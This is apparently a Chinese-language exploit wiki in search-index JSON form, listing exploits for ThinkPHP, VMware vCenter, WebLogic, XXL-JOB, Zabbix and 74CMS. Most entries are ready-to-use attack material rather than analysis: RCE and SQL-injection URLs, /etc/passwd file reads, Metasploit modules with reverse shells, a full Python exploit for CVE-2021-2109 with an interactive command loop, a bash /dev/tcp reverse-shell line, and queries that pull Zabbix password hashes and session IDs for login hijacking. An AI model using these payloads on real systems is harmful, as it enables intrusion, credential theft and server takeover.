命令执行： ?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 漏洞分析 5.0 注入 # thinphp 5.0.13 $username]) username 传入数组可以注入, NOT LIKE 第三个参数可以指定多个like查询的关系,如 and 插入sql语句,导致注入.. http://localhost:8000/index/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()--+ # 5.1.16 5.0.24存在反序列化 这是个鸡肋漏洞，很难利用 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/":{"url":"Vmware/","title":"Vmware","keywords":"","body":"应用简介 官方网站：https://www.vmware.com/cn.html vSphere 统一管理容器和虚拟机 vCenter Server 是高级服务器管理软件，提供一个集中式平台控制 VMware vSphere 环境 vRealize 灵活的云管理，将 SaaS 和本地部署功能相结合以实现自动化、运维和分析 相关资产 VMware-vCenter app=\"vmware-vCenter\" app=\"vmware-ESXi\" title=\"ID_VC_Welcome\" VMware-vRealize title=\"vRealize Operations Manager\" VMware View Planner title=\"VMware View\" POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）/":{"url":"Vmware/VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）/","title":"VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）","keywords":"","body":"漏洞概述 VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件 影响范围 VMware vCenter Server 6.5.0a- f 版本 POC urls.txt用于存放目标HOST，然后直接运行此脚本即可 python vCenter-info-leak.py 漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中 EXP @佩奇文库 Windows主机 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties Linux主机 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）/":{"url":"Vmware/VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）/","title":"VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）","keywords":"","body":"漏洞概述 通过443访问vCenter Server的攻击者可以直接通过请求在目标主机上执行任意代码，并接管目标主机 影响范围 VMware vCenter Server 7.0 非7.0 U2b版本 VMware vCenter Server 6.7 非6.7 U3n版本 VMware vCenter Server 6.5 非6.5 U3p版本 VMware Cloud Foundation POC @alt3kx nmap -p443 --script CVE-2021-21985.nse EXP 暂无 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/VMware vCenter任意文件读取漏洞/":{"url":"Vmware/VMware vCenter任意文件读取漏洞/","title":"VMware vCenter任意文件读取漏洞","keywords":"","body":"漏洞概述 VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件 影响范围 VMware vCenter Server 6.5.0a- f 版本 POC urls.txt用于存放目标HOST，然后直接运行此脚本即可 python vCenter-info-leak.py 漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中 EXP @佩奇文库 Windows主机 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties Linux主机 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/VMware View Planner 未授权RCE漏洞（CVE-2021-21978）/":{"url":"Vmware/VMware View Planner 未授权RCE漏洞（CVE-2021-21978）/","title":"VMware View Planner 未授权RCE漏洞（CVE-2021-21978）","keywords":"","body":"漏洞概述 VMware View Planner Web管理界面存在一个上传日志功能文件的入口，没有进行认证且写入的日志文件路径用户可控，通过覆盖上传日志功能文件log_upload_wsgi.py，即可实现RCE 影响范围 VMware View Planner 4.6 POC nuclei -tags vmware -t cves/ -l urls.txt Goby EXP 1、写webshell @skytina python CVE-2021-21978.py https://192.168.80.3 2、反弹shell @me1ons python re-shell.py -u 目标IP -v VPS-IP -p 1234 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Vmware/VMware vRealize Operations Manager SSRF（CVE-2021-21975）/":{"url":"Vmware/VMware vRealize Operations Manager SSRF（CVE-2021-21975）/","title":"VMware vRealize Operations Manager SSRF（CVE-2021-21975）","keywords":"","body":"漏洞概述 攻击者可通过访问web管理端向vCenter Server发送请求从而在操作系统上执行任意命令或者上传一个webshell到vcenter服务器的任意位置执行. 漏洞影响 VMware vCenter Server 7.0系列 POC nuclei -tags vmware -t cves/ -l urls.txt Goby（需导入佩奇文库的POC） EXP @NS-Sp4ce python CVE-2021-21972.py -url https://192.168.2.1 payload文件夹内的tar文件为默认冰蝎3 webshell https://domain.com/ui/resources/shell.jsp POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/weblogic.html":{"url":"Weblogic/weblogic.html","title":"Weblogic","keywords":"","body":"[CVE-2020-2551]-IIOP反序列化 漏洞概述 攻击者通过IIOP协议远程访问WebLogic Server服务器上的远程接口； 传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码 #影响版本 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 漏洞验证 网上暂无可稳定利用的EXP（部分无法利用），可尝试 https://github.com/Y4er/CVE-2020-2551 漏洞分析 https://www.anquanke.com/post/id/197605 https://www.anquanke.com/post/id/206494 修复建议 1、补丁升级：登陆https://support.oracle.com后，下载最新补丁 2、临时规避措施：通过禁用IIOP协议对漏洞进行缓解 [CVE-2020-2883]-T3反序列化 漏洞概述 该漏洞是2555补丁的绕过 #影响版本 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 漏洞利用 use multi/misc/weblogic_deserialize_badattr_extcomp 修复建议 1、升级补丁：登陆https://support.oracle.com后，下载最新补丁 2、临时规避措施：通过禁用T3协议对漏洞进行缓解 [CVE-2020-14644]-远程命令执行 漏洞概述 #影响版本 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 漏洞利用 下载EXP：https://github.com/potats0/cve_2020_14644/releases/tag/0.0.2 java -jar cve-2020-14644.jar 127.0.0.1 7001 whoami 漏洞分析 https://www.cnblogs.com/potatsoSec/p/13451993.html [CVE-2020-14882]-未授权命令执行 漏洞概述 #影响版本 （有console控制台存在的） 10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码 漏洞利用 use exploit/multi/http/weblogic_admin_handle_rce 修复建议 配置 WebLogic 禁用 Console 控制台 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2017-10271]-XMLDecoder反序列化/":{"url":"Weblogic/[CVE-2017-10271]-XMLDecoder反序列化/","title":"[CVE-2017-10271]-XMLDecoder反序列化","keywords":"","body":"漏洞概述 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。 影响范围 10.3.6.0 12.1.3.0.0 12.2.1.1.0 EXP MSF 参考链接 https://www.oracle.com/security-alerts/cpujan2021.html#AppendixFMW POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2019-2725]-wls反序列化/":{"url":"Weblogic/[CVE-2019-2725]-wls反序列化/","title":"[CVE-2019-2725]-wls反序列化","keywords":"","body":"漏洞概述 WebLogic wls9-async反序列化远程命令执行漏洞 攻击者利用该漏洞，可在未授权的情况下远程执行命令 影响范围 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 Weblogic 12.2.1.4.0 POC nuclei -tags weblogic -t cves/ -l urls.txt EXP use multi/misc/weblogic_deserialize_asyncresponseservice set payload cmd/unix/reverse_bash #target->unix,这个payload实测成功 这个模块也适用于Weblogic XMLdecoder反序列化漏洞 (CVE-2017-10271) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-14644]-远程命令执行/":{"url":"Weblogic/[CVE-2020-14644]-远程命令执行/","title":"[CVE-2020-14644]-远程命令执行","keywords":"","body":"影响范围 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 漏洞利用 下载EXP：https://github.com/potats0/cve_2020_14644/releases/tag/0.0.2 java -jar cve-2020-14644.jar 127.0.0.1 7001 whoami 漏洞分析 https://www.cnblogs.com/potatsoSec/p/13451993.html POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-14645]-T3反序列化/":{"url":"Weblogic/[CVE-2020-14645]-T3反序列化/","title":"[CVE-2020-14645]-T3反序列化","keywords":"","body":"漏洞概述 该漏洞是对 CVE-2020-2883的补丁进行绕过，该漏洞通过T3协议进行利用，攻击者可以实现远程代码执行，进而控制服务器 影响范围 WebLogic Server 10.3.6.0.0 WebLogic Server 12.2.1.4.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.1.3.0.0 WebLogic Server 14.1.1.0.0 EXP @Y4er 分析参考 https://paper.seebug.org/1280/ https://paper.seebug.org/1287/ POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-14756]-IIOP-T3反序列化/":{"url":"Weblogic/[CVE-2020-14756]-IIOP-T3反序列化/","title":"[CVE-2020-14756]-IIOP-T3反序列化","keywords":"","body":"漏洞概述 Oracle Coherence组件存在授权问题漏洞，该漏洞允许未经身份验证的攻击者通过IIOP、T3进行网络访问，从而破坏Oracle一致性。 影响范围 WebLogic 3.7.1.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 WebLogic 14.1.1.0.0 EXP @Y4er POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-14882]-未授权命令执行/":{"url":"Weblogic/[CVE-2020-14882]-未授权命令执行/","title":"[CVE-2020-14882]-未授权命令执行","keywords":"","body":"漏洞概述 未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码 影响范围 #（有console控制台存在的） 10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 漏洞利用 use exploit/multi/http/weblogic_admin_handle_rce POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-2551]-IIOP反序列化/":{"url":"Weblogic/[CVE-2020-2551]-IIOP反序列化/","title":"[CVE-2020-2551]-IIOP反序列化","keywords":"","body":"漏洞概述 该漏洞存在于weblogic核心组件，影响的协议为IIOP。 影响范围 10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 EXP @Y4er 扩展参考 https://www.anquanke.com/post/id/206494 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-2555]-T3反序列化/":{"url":"Weblogic/[CVE-2020-2555]-T3反序列化/","title":"[CVE-2020-2555]-T3反序列化","keywords":"","body":"漏洞概述 Oracle Fusion中间件Oracle Coherence存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取Weblogic服务器权限，执行任意命令 影响范围 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 EXP use exploit/multi/misc/weblogic_deserialize_badattrval 修复建议 1、直接升级weblogic到最新版本或安装升级补丁 2、如果不依赖T3协议进行JVM通信，禁用T3协议 进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl 在连接筛选器规则框中输入 7001 deny t3 t3s 保存生效（需重启） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/[CVE-2020-2883]-T3反序列化/":{"url":"Weblogic/[CVE-2020-2883]-T3反序列化/","title":"[CVE-2020-2883]-T3反序列化","keywords":"","body":"漏洞概述 该漏洞是2555补丁的绕过 影响范围 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 漏洞利用 use multi/misc/weblogic_deserialize_badattr_extcomp POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html":{"url":"Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html","title":"Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109","keywords":"","body":"Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 漏洞描述 2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。 漏洞影响 [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 访问一下URL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal 如果有此页面未授权可访问，且在影响范围内则可能出现漏洞 下载漏洞攻击需要的 LDAP启动脚本 下载链接 下载到服务器上启动 java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (服务器地址) [!NOTE] 部分服务器注意放行端口 然后配合 Weblogic未授权范围 命令执行 /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] 注意 ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho 这里 LDAP服务器地址第三个分隔符号为 ; 登录后台可使用此POC，未授权的话用上面的 /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) 漏洞利用POC [!NOTE] 注意参数格式 Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 中的分号 如果使用其他的利用Ldap服务请自行更改 POC关键字 此POC仅仅检验有未授权的情况 import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Weblogic 多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap >>> \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) Goby & POC [!NOTE] Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 注意漏洞验证 Ldap参数同样跟上面的POC一样格式，注意分号 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"WordPress/":{"url":"WordPress/","title":"Word Press","keywords":"","body":"POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"XXLjob/":{"url":"XXLjob/","title":"XX Ljob","keywords":"","body":"应用简介 XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。 Github：https://github.com/xuxueli/xxl-job/ 默认账户：admin/123456 相关资产 FOFA app=\"XXL-JOB\" 环境搭建 Docker: https://blog.csdn.net/dylloveyou/article/details/104455550 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"XXLjob/xxl-job API接口未授权访问RCE/":{"url":"XXLjob/xxl-job API接口未授权访问RCE/","title":"xxl-job API接口未授权访问RCE","keywords":"","body":"漏洞概述 默认情况下XXL-JOB的API接口没有开启认证，未经授权的攻击者可以构造一个恶意请求，实现远程命令执行。 影响范围 XXL-JOB POC Goby EXP POST /run HTTP/1.1 Host: 127.0.0.1:9999 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded { \"jobId\": 1, \"executorHandler\": \"demoJobHandler\", \"executorParams\": \"demoJobHandler\", \"executorBlockStrategy\": \"COVER_EARLY\", \"executorTimeout\": 0, \"logId\": 1, \"logDateTime\": 1586629003729, \"glueType\": \"GLUE_POWERSHELL\", \"glueSource\": \"calc\", #执行的bash语句 \"glueUpdatetime\": 1586699003758, \"broadcastIndex\": 0, \"broadcastTotal\": 0 } python3 xxl-job-rce.py 192.168.1.1 -c calc python3 xxl-job-rce.py 192.168.1.1 -c calc -m shell -p 9999 参考链接 https://github.com/jas502n/xxl-job POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Zabbix/":{"url":"Zabbix/","title":"Zabbix","keywords":"","body":"应用简介 Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。 可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用 官方网站：https://www.zabbix.com/cn 默认口令：Admin/zabbix 相关资产 FOFA app=\"ZABBIX-监控系统\" [弱口令]-后台Getshell 在管理-脚本-创建脚本写入反弹shell命令 bash -i >& /dev/tcp/VPS的IP/6666 0>&1 在监测-问题处打开一个主机，然后找到刚刚创建的脚本执行 SQL注入 2.2.x 3.0.0-3.0.3 攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限 漏洞利用 在攻击机访问的zabbix的地址后面加上如下url： /jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi story.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfil e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype= 17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=& mark_color=1 输出结果，若包含：You have an error in your SQL syntax;表示漏洞存在 获取用户名 jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17 获取密码 jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17 获取sessionid http://IP/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,sessionid,0x7e)%20as%20char),0x7e))%20from%20zabbix.sessions%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17 用户名密码及sessionid值都已得到，可以先对密码md5解密，解密成功可直接进入后台。 解密不成功可以用sessionid值进行Cookie欺骗替换zbx_sessionid即可成功以administrator登陆 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"骑士CMS/":{"url":"骑士CMS/","title":"骑士CMS","keywords":"","body":"应用简介 骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才网站系统。 官方网站：https://www.74cms.com 相关资产 FOFA app=\"骑士-74CMS\" 环境搭建 骑士CMS搭建与利用 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"骑士CMS/骑士CMS远程代码执行/":{"url":"骑士CMS/骑士CMS远程代码执行/","title":"骑士CMS远程代码执行","keywords":"","body":"影响范围 骑士CMS 漏洞利用 首先在前台注册一个普通用户，然后更新简历： 完成简历更新后，上传照片： 在上传图片马后，会生成图片地址： 复制路径，通过 a 方法调用assign_resume_tpl函数，再通过 POST 的方式提交该路径，即可包含成功 http://192.168.159.208/index.php?m=home&a=assign_resume_tpl POST: variable=1&tpl=../../../../var/www/html/data/upload/resume_img/2011/13/5fae95e469e05.jpg 如下图所示： 值得一提的是，通过上面的分析我们可以知道，在解析模板的时候，不是解析原生的 PHP 代码，因此如果图片马是纯 PHP 代码是无法利用成功的，必须要包括骑士 CMS 模板文件的标签，我们可以随便打开一个原有模板，然后复制一句话即可，如：/Application/Home/View/tpl_company/default/com_jobs_list.html 因此最终的图片马所要包含的内容应该是： 另外一点，骑士 CMS 对于图片上传是有过滤的，所以需要绕过技巧，具体可以自行研究，当然你也可以考虑上传 docx 或者其他类型的文件，对于包含的结果是没有影响的 参考链接 @panda POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "}}